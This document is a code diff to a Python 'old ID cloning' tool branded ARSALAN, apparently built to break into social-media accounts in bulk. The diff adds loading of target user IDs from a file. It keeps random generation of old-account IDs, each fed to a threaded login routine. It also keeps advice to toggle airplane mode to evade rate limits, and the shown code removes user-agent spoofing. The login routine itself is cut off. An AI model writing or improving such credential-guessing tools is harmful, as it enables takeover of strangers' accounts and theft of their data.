@@ -14,6 +14,9 @@ from concurrent.futures import ThreadPoolExecutor as tred
 from os import system
 from datetime import datetime
 
+# Tool Version definition
+TOOL_VERSION = "v2.0"
+
 # Ensure required modules are installed
 modules = ['requests', 'urllib3', 'mechanize', 'rich']
 for module in modules:
@@ -27,11 +30,9 @@ from requests.exceptions import ConnectionError
 from requests import api, models, sessions
 requests.urllib3.disable_warnings()
 
-
-# Initial setup and promotion
+# Initial setup and loading
 os.system('clear')
-print('\x1b[38;5;46mARSALAN SERVER LOADING....')
-
+print('\x1b[38;5;46mARSALAN SERVER LOADING.... [ ' + TOOL_VERSION + ' ]')
 
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 os.system('pip install httpx pip install beautifulsoup4')
@@ -49,7 +50,7 @@ def arsalan_approval():
     print("\033[1;33m/ _ \\  | |_)| | _\\  | / _ \\  || |")
     print("\033[1;34m/__ \\  _< || |/__ \\ |/ /__ \\ |\\ \\__")
     print("\033[1;35m_/  \\__\\__\\_/_/  \\__\\__/____/\\____/ \\__")
-    print("\033[1;36m---------------------------------------------\033[0m")
+    print(f"\033[1;36m--------------------------------------------- [{TOOL_VERSION}] \033[0m")
     print('\x1b[38;5;48m--------------------------------------------------------')
     print(f'\x1b[1;37mYOUR KEY : \x1b[1;32mARSALAN-{key}')
     print('\x1b[38;5;48m--------------------------------------------------------')
@@ -62,7 +63,7 @@ def arsalan_approval():
     print("\x1b[1;37mStatus: \x1b[1;31mChecking Approval...")
 
 time.sleep(2)
-print("\033[32;41m\t Welcome ARSALAN TOOL 🔥 \033[0m")
+print(f"\033[32;41m\t Welcome ARSALAN TOOL 🔥 ({TOOL_VERSION}) \033[0m")
 
 # --- Anti-tampering and Security Checks ---
 try:
@@ -122,20 +123,6 @@ W = '\x1b[1;37m'
 
 import random
 
-def windows():
-    aV = random.choice(range(10, 20))
-    chrome_major_old = random.choice(range(100, 115))
-    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.1; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_old}.0.{random.choice(range(5000, 6500))}.0 Safari/537.36"
-    bz = f"537.36"
-    chrome_major_mid = random.choice(range(115, 125))
-    B = f"Mozilla/5.0 (Windows NT {random.choice([10, 11])}.0; Win64; x64) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{chrome_major_mid}.0.{random.choice(range(6000, 6800))}.{random.choice(range(1, 150))} Safari/{bz}"
-    chrome_major_wow = random.choice(range(120, 130))
-    C = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_wow}.0.{random.choice(range(6000, 6900))}.{random.choice(range(1, 150))} Safari/537.36"
-    chrome_latest = random.choice(range(130, 143))
-    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_latest}.0.{random.choice(range(6500, 7200))}.0 Safari/537.36"
-    return random.choice([A, B, C, D])
-
-
 def window1():
     chrome_major = random.choice(range(120, 140))
     build_1 = random.choice(range(6000, 7100))
@@ -153,7 +140,7 @@ def window1():
     D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ultra}.0.{latest_build}.{latest_patch} Safari/537.36"
     return random.choice([A, B, C, D])
 
-sys.stdout.write('\x1b]2;👑【 A.R.S.A.L.A.N 👑 】\x07')
+sys.stdout.write(f'\x1b]2;👑【 A.R.S.A.L.A.N 👑 - {TOOL_VERSION} 】\x07')
 
 
 def ____banner____():
@@ -161,7 +148,7 @@ def ____banner____():
         os.system('cls')
     else:
         os.system('clear')
-    print("""\033[1;32m
+    print(f"""\033[1;32m
 ==========================================                                                         
 ╔═══╗  ╔═╗╔═╗ ╔═╗╔═╗  ╔═╗
 ║████╗ ║██║██  ║██╚███████║███████║██  ║██║██  ║██
@@ -170,60 +157,9 @@ def ____banner____():
 ║██  ╚████╚██══╝██     ║██╔════╝██╚██══╝██╚██══╝██
 ╚██   ╚███ ╚█████      ╚██╚███████ ╚██████ ╚█████ 
 OWNER : ARSALAN CLONER 804
-TOOLS : OLD ID CLONING 
+TOOLS : OLD ID CLONING ({TOOL_VERSION})
 ==========================================                            
 \033[0m""")
-
-
-def creationyear(uid):
-    if len(uid) == 15:
-        if uid.startswith('1000000000') or uid.startswith('100000000') or uid.startswith('10000000'):
-            return '2009'
-        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
-            return '2009'
-        if uid.startswith(('1000006', '1000007', '1000008', '1000009')) or uid.startswith('100001'):
-            return '2010'
-        if uid.startswith(('100002', '100003')):
-            return '2011'
-        if uid.startswith('100004'):
-            return '2012'
-        if uid.startswith(('100005', '100006')):
-            return '2013'
-        if uid.startswith(('100007', '100008')):
-            return '2014'
-        if uid.startswith('100009'):
-            return '2015'
-        if uid.startswith('10001'):
-            return '2016'
-        if uid.startswith('10002'):
-            return '2017'
-        if uid.startswith('10003'):
-            return '2018'
-        if uid.startswith('10004'):
-            return '2019'
-        if uid.startswith('10005'):
-            return '2020'
-        if uid.startswith('10006'):
-            return '2021'
-        if uid.startswith('10009'):
-            return '2023'
-        if uid.startswith(('10007', '10008')):
-            return '2022'
-        return ''
-    elif len(uid) in (9, 10):
-        return '2008'
-    elif len(uid) == 8:
-        return '2007'
-    elif len(uid) == 7:
-        return '2006'
-    elif len(uid) == 14 and uid.startswith('61'):
-        return '2024'
-    else:
-        return ''
-
-
-def clear():
-    os.system('clear')
 
 
 def linex():
@@ -232,15 +168,51 @@ def linex():
 
 def BNG_71_():
     ____banner____()
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE')
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE (RANDOM)')
+    linex()
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mFILE UID CLONE (ids.txt)')
     linex()
     __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mCHOICE  {W}: {Y}")
     if __Jihad__ in ('A', 'a', '01', '1'):
         old_clone()
+    elif __Jihad__ in ('B', 'b', '02', '2'):
+        file_clone()
     else:
         print(f"\n    {rad}Choose Valid Option... ")
         time.sleep(2)
         BNG_71_()
+
+
+def file_clone():
+    global user
+    ____banner____()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mFILE UID CLONING")
+    linex()
+    try:
+        file_path = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mENTER FILE PATH (e.g ids.txt) {Y}:{G} ")
+        if not file_path:
+            file_path = "ids.txt"
+        with open(file_path, "r") as f:
+            for line in f:
+                uid = line.strip()
+                if uid:
+                    user.append(uid)
+    except Exception as e:
+        print(f"\n    {rad}[!] File not found or error reading file!")
+        time.sleep(2)
+        BNG_71_()
+        return
+
+    linex()
+    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL LOADED IDs {Y}: {G}{len(user)}")
+    linex()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM FILE {Y}: {G} {len(user)}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        linex()
+        for uid in user:
+            pool.submit(login_1, uid)
 
 
 def old_clone():
@@ -277,10 +249,6 @@ def old_One():
     for _ in range(int(limit)):
         data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
         user.append(data)
-    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD 2')
-    linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
         print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
@@ -288,11 +256,7 @@ def old_One():
         linex()
         for mal in user:
             uid = star + mal
-            if meth in ('A', 'B'):
-                pool.submit(login_1, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
+            pool.submit(login_1, uid)
 
 
 def old_Tow():
@@ -311,53 +275,37 @@ def old_Tow():
         suffix = ''.join(random.choices('0123456789', k=9))
         uid = prefix + suffix
         user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
-    linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
         print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
         print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
-            if meth in ('A', 'B'):
-                pool.submit(login_1, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
+            pool.submit(login_1, uid)
 
 
 def old_Tree():
     user = []
     ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
-    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
+    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
     linex()
     prefix = '1000004'
     for _ in range(int(limit)):
         suffix = ''.join(random.choices('0123456789', k=8))
         uid = prefix + suffix
         user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
-    linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
         print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
         print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
-            if meth in ('A', 'B'):
-                pool.submit(login_1, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
+            pool.submit(login_1, uid)
 
 
 def login_1(uid):
